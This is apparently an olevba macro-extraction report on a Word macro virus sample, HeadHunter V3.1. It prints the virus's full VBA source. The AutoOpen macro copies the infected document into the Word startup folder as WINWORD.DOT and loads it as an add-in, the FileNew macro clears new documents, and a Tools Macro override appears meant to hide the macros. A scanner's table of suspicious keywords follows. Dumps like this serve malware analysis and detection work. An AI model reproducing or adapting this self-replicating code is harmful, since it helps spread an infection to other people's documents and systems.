olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hunter.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hunter.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ExtrasMakro.bas 
in file: Virus.MSWord.Hunter.e - OLE stream: 'Macros/VBA/ExtrasMakro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Erstellt, lцscht und ьberarbeitet einen Makro oder fьhrt ihn aus."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ExtrasMakro.MAIN"
On Error GoTo -1: On Error GoTo Exit_
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
WordBasic.CurValues.ToolsMacro dlg
dlg.Show = 1
WordBasic.Dialog.ToolsMacro dlg
WordBasic.ToolsMacro dlg
Exit_:
End Sub
-------------------------------------------------------------------------------
VBA MACRO DateiNeu.bas 
in file: Virus.MSWord.Hunter.e - OLE stream: 'Macros/VBA/DateiNeu'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Erstellt ein neues Dokument oder eine Dokumentvorlage."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiNeu.MAIN"
Dim F242$
On Error GoTo -1: On Error GoTo Exit_
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
WordBasic.CurValues.FileNew dlg
WordBasic.Dialog.FileNew dlg
F242$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
If WordBasic.[Files$](F242$) <> "" Then
 dlg.Template = F242$
 dlg.NewTemplate = 1
End If
WordBasic.FileNew dlg
WordBasic.EditSelectAll
WordBasic.WW6_EditClear
Exit_:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hunter.e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem  ********************************************************************
Rem  ***    <HEADHUNTER V3.1> by Neurobasher, 19.10.1995, Germany     ***
Rem  *** Boring experimental Winword virus with minor retro & stealth ***
Rem  ********************************************************************
Rem  *** "I'm looking for a man who knows the rules of the game"      ***
Rem  *** "Who's able to forget them to realize my aim"                ***
Rem  ********************************************************************

Public Sub MAIN()
Dim F242$
On Error GoTo -1: On Error GoTo Exit_

If WordBasic.Second(WordBasic.Now()) = 1 Then
 WordBasic.MsgBox "One - You lock the target" + Chr(13) + "Two - You bait the line" + Chr(13) + "Three - You slowly spread the net" + Chr(13) + "And four - You catch the man", "<HeadHunter V3.1>"
End If

If WordBasic.[DefaultDir$](8) = "" Then
 WordBasic.MkDir WordBasic.[DefaultDir$](9) + "\AutoStrt"
 WordBasic.ChDefaultDir WordBasic.[DefaultDir$](9) + "\AutoStrt", 8
End If

F242$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
If WordBasic.[Files$](F242$) = "" Then
 WordBasic.CopyFile WordBasic.[FileName$](), F242$
 WordBasic.AddAddIn F242$, 1
End If

Exit_:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

